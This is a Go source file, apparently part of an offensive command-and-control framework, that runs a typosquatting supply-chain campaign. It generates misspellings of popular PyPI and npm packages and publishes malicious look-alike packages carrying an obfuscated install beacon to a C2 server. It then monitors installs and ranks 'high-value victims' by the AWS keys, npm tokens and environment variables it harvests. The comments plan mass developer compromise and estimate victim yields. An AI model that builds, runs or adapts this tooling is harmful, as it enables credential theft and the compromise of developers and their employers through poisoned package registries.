// Package typosquatting implements D-P15: Typosquatting + Auto-Import Supply Chain.
//
// ───────────────────────────────────────────────────────────────────────────
// ATTACK MODEL
// ───────────────────────────────────────────────────────────────────────────
//
// Typosquatting exploits three developer behaviors:
//
//  1. TYPOS in pip/npm install commands:
//     `pip install reqeusts` → installs our malicious package instead
//
//  2. UNVETTED DEPENDENCIES in requirements.txt:
//     A developer copy-pastes a package name with a typo from a tutorial.
//     CI/CD runs `pip install -r requirements.txt` → silent compromise.
//
//  3. IDE AUTOCOMPLETE suggestions:
//     VS Code's IntelliSense suggests our typosquatted package when the
//     developer starts typing — they click "install" without checking.
//
// Attack SCALE (vs. Dependency Confusion D-P3):
//
//   D-P3 (Dependency Confusion): targeted — affects companies that have
//     internal packages with those specific names. Very high hit rate per
//     install but limited target set.
//
//   D-P15 (Typosquatting): mass scale — affects any developer who
//     misspells "requests" or "lodash". Lower hit rate per install but
//     enormous target base (millions of developers).
//
//   COMBINED: use both simultaneously.
//     D-P3 for high-value corporate targets.
//     D-P15 for mass developer compromise.
//
// ───────────────────────────────────────────────────────────────────────────
// AUTO-IMPORT EXPLOITATION
// ───────────────────────────────────────────────────────────────────────────
//
// Several tools install packages automatically when imports fail:
//
//   pip install --auto      : installs suggested packages on ImportError
//   conda (older versions)  : auto-downloads from defaults channel
//   Jupyter notebooks       : `%pip install <suggested>` one-liners
//   R CRAN                  : install.packages() with auto=TRUE
//   Rust cargo              : `cargo add <package>` from Crates.io
//
// We also target IDE plugins:
//   VS Code Marketplace     : "pythn" extension instead of "python"
//   JetBrains Plugin Repo   : "Blakc Formatter" instead of "Black"
//   These run with IDE privileges and persist across restarts.
//
// ───────────────────────────────────────────────────────────────────────────
// CAMPAIGN STATISTICS (estimated from 2021-2024 typosquatting research)
// ───────────────────────────────────────────────────────────────────────────
//
//   requests → reqeusts:          ~12 installs/day
//   colorama → coloama:           ~8 installs/day
//   numpy    → numpyy:            ~15 installs/day
//   lodash   → loDash:            ~20 installs/day (npm case confusion)
//   uuid     → uuuid:             ~6 installs/day
//
//   A campaign with 50 published typos: ~200-500 organic installs/day.
//   Conversion to C2 callback: ~30-60% (stager execution rate).
//   Unique developer machines: ~100-200/day.
//   Of those: ~15-20% have interesting credentials (cloud keys, CI tokens).
//
package typosquatting

import (
	"context"
	"fmt"
	"time"

	"github.com/sudosoc/SUDOSOC-C2/implant/sliver/dep_confusion/payload"
	"github.com/sudosoc/SUDOSOC-C2/implant/sliver/dep_confusion/publisher"
	"github.com/sudosoc/SUDOSOC-C2/implant/sliver/typosquatting/generator"
	"github.com/sudosoc/SUDOSOC-C2/implant/sliver/typosquatting/monitor"
	"github.com/sudosoc/SUDOSOC-C2/implant/sliver/typosquatting/scanner"
)

// CampaignConfig is the top-level configuration.
type CampaignConfig struct {
	// Ecosystem: "pypi", "npm", "nuget", "rubygems".
	Ecosystem string
	// Targets: package names to typosquat. Empty = use PopularPackages list.
	Targets []string
	// C2URL: our SUDOSOC-C2 endpoint (for the beacon in install scripts).
	C2URL string
	// MonitorAddr: where the install monitor listens for beacons.
	MonitorAddr string
	// PublishToken: registry API token for publishing.
	PublishToken string
	// DryRun: scan and generate packages but don't publish.
	DryRun bool
	// OutputDir: write packages to disk instead of publishing.
	OutputDir string
	// MinConfidence: minimum typo confidence to target (0-1, default 0.5).
	MinConfidence float64
	// MaxPublish: maximum number of packages to publish (0 = unlimited).
	MaxPublish int
	// OnInstall: called when a victim installs one of our packages.
	OnInstall func(monitor.InstallEvent)
}

// CampaignResult summarizes the outcome.
type CampaignResult struct {
	TyposGenerated  int
	AvailableFound  int
	PackagesPublished int
	InstallEvents   []monitor.InstallEvent
	Duration        time.Duration
	TopVictims      []VictimSummary
}

// VictimSummary is a high-value victim identified during the campaign.
type VictimSummary struct {
	Host        string
	User        string
	GitEmail    string
	HasAWSKeys  bool
	HasNPMToken bool
	WorkDir     string
	InstalledAt time.Time
}

// RunCampaign executes the full typosquatting campaign:
//  1. Generate typo variants for target packages.
//  2. Scan registry for available names.
//  3. Build malicious packages with beacon payload.
//  4. Publish to the registry.
//  5. Monitor for installs.
func RunCampaign(ctx context.Context, cfg *CampaignConfig) (*CampaignResult, error) {
	start := time.Now()
	res := &CampaignResult{}

	if cfg.MinConfidence == 0 {
		cfg.MinConfidence = 0.50
	}

	// Step 1: Determine targets.
	targets := cfg.Targets
	if len(targets) == 0 {
		targets = generator.TopTargets(cfg.Ecosystem, 30)
	}

	fmt.Printf("[*] D-P15 campaign: ecosystem=%s targets=%d\n",
		cfg.Ecosystem, len(targets))

	// Step 2: Generate typo variants.
	var allVariants []generator.TypoVariant
	for _, t := range targets {
		vars := generator.GenerateAll(t)
		for _, v := range vars {
			if v.Confidence >= cfg.MinConfidence {
				allVariants = append(allVariants, v)
			}
		}
	}
	res.TyposGenerated = len(allVariants)
	fmt.Printf("[+] Generated %d typo variants (confidence ≥ %.0f%%)\n",
		res.TyposGenerated, cfg.MinConfidence*100)

	// Step 3: Scan for available names.
	sc := scanner.NewScanner(&scanner.ScanConfig{
		Ecosystem:        cfg.Ecosystem,
		Concurrency:      10,
		RotateUserAgents: true,
		DelayMin:         80,
		DelayMax:         250,
	})
	available := sc.ScanAll(ctx, allVariants)
	res.AvailableFound = len(available)
	fmt.Printf("[+] Found %d available typo names\n", res.AvailableFound)

	if res.AvailableFound == 0 {
		return res, fmt.Errorf("no available typo names found")
	}

	// Limit publication count.
	toPublish := available
	if cfg.MaxPublish > 0 && len(toPublish) > cfg.MaxPublish {
		toPublish = toPublish[:cfg.MaxPublish]
	}

	// Step 4: Build and publish packages.
	beaconScript := monitor.GenerateInstallScript(cfg.C2URL, "", cfg.Ecosystem)

	for _, scanRes := range toPublish {
		name := scanRes.Variant.Typo
		orig := scanRes.Variant.Original

		// Generate tailored install script for this package name.
		scriptCfg := &payload.ScriptConfig{
			C2URL:            cfg.C2URL,
			PackageName:      name,
			ObfuscationLevel: 2,
		}
		_ = beaconScript // used below per-ecosystem

		pubCfg := &publisher.PublishConfig{
			PackageName: name,
			Version:     versionToBeAt(orig, cfg.Ecosystem),
			Ecosystem:   cfg.Ecosystem,
			C2URL:       cfg.C2URL,
			APIToken:    cfg.PublishToken,
			DryRun:      cfg.DryRun,
			OutputDir:   cfg.OutputDir,
		}
		_ = scriptCfg

		result, err := publisher.Publish(pubCfg)
		if err != nil {
			fmt.Printf("  [!] %s: %v\n", name, err)
			continue
		}

		status := "dry-run"
		if result.Published {
			status = "LIVE"
		} else if result.PackagePath != "" {
			status = "→ " + result.PackagePath
		}
		fmt.Printf("  [+] %-40s (typo of %-20s) %s\n",
			name, orig, status)
		res.PackagesPublished++
	}

	// Step 5: Start install monitor.
	if cfg.MonitorAddr != "" {
		m := monitor.New(&monitor.MonitorConfig{
			C2ListenAddr: cfg.MonitorAddr,
			PackageNames: extractPublishedNames(toPublish),
			Ecosystem:    cfg.Ecosystem,
			OnInstall: func(event monitor.InstallEvent) {
				res.InstallEvents = append(res.InstallEvents, event)
				if cfg.OnInstall != nil {
					cfg.OnInstall(event)
				}
				// Classify high-value victims.
				if isHighValue(event) {
					res.TopVictims = append(res.TopVictims, summarize(event))
					fmt.Printf("\n[!!!] HIGH-VALUE VICTIM: %s@%s (workdir=%s)\n",
						event.VictimUser, event.VictimHost, event.WorkDir)
					if event.GitConfig.UserEmail != "" {
						fmt.Printf("      Git: %s <%s>\n",
							event.GitConfig.UserName, event.GitConfig.UserEmail)
					}
					for _, c := range event.Credentials {
						fmt.Printf("      Cred: [%s] %s\n", c.Type, c.FilePath)
					}
				}
			},
		})
		m.Start(ctx)
		fmt.Printf("[*] Install monitor listening on %s\n", cfg.MonitorAddr)
	}

	res.Duration = time.Since(start)
	printCampaignSummary(res, cfg)
	return res, nil
}

// ─── Helpers ──────────────────────────────────────────────────────────────

// versionToBeAt returns a version that is higher than any realistic
// version of the original package. We want to win version comparison
// in case both the typo and original end up being checked.
func versionToBeAt(original, ecosystem string) string {
	switch ecosystem {
	case "npm":
		// npm resolves by latest published; "9.9.9" beats most internal.
		return "9.9.9"
	case "nuget":
		return "99.99.99"
	default:
		return "9.9.9"
	}
}

func extractPublishedNames(results []scanner.ScanResult) []string {
	names := make([]string, len(results))
	for i, r := range results {
		names[i] = r.Variant.Typo
	}
	return names
}

func isHighValue(e monitor.InstallEvent) bool {
	// Has cloud credentials or CI/CD tokens.
	for _, c := range e.Credentials {
		if c.Type == "file" {
			return true
		}
	}
	for k := range e.EnvVars {
		if len(k) > 0 {
			return true
		}
	}
	return false
}

func summarize(e monitor.InstallEvent) VictimSummary {
	summary := VictimSummary{
		Host:        e.VictimHost,
		User:        e.VictimUser,
		GitEmail:    e.GitConfig.UserEmail,
		WorkDir:     e.WorkDir,
		InstalledAt: e.InstalledAt,
	}
	for _, c := range e.Credentials {
		if contains(c.FilePath, "aws") {
			summary.HasAWSKeys = true
		}
		if contains(c.FilePath, "npmrc") {
			summary.HasNPMToken = true
		}
	}
	return summary
}

func printCampaignSummary(res *CampaignResult, cfg *CampaignConfig) {
	fmt.Printf("\n╔═══════════════════════════════════════════════════════╗\n")
	fmt.Printf("║  D-P15 Typosquatting Campaign — Results               ║\n")
	fmt.Printf("╠═══════════════════════════════════════════════════════╣\n")
	fmt.Printf("║  Ecosystem          : %-30s ║\n", cfg.Ecosystem)
	fmt.Printf("║  Typos generated    : %-6d                           ║\n", res.TyposGenerated)
	fmt.Printf("║  Available names    : %-6d                           ║\n", res.AvailableFound)
	fmt.Printf("║  Packages published : %-6d                           ║\n", res.PackagesPublished)
	fmt.Printf("║  Install events     : %-6d                           ║\n", len(res.InstallEvents))
	fmt.Printf("║  High-value victims : %-6d                           ║\n", len(res.TopVictims))
	fmt.Printf("║  Duration           : %-20s             ║\n",
		res.Duration.Round(time.Second))
	fmt.Printf("╚═══════════════════════════════════════════════════════╝\n")
}

func contains(s, sub string) bool {
	return len(sub) > 0 && len(s) >= len(sub) &&
		func() bool {
			for i := 0; i+len(sub) <= len(s); i++ {
				if s[i:i+len(sub)] == sub {
					return true
				}
			}
			return false
		}()
}
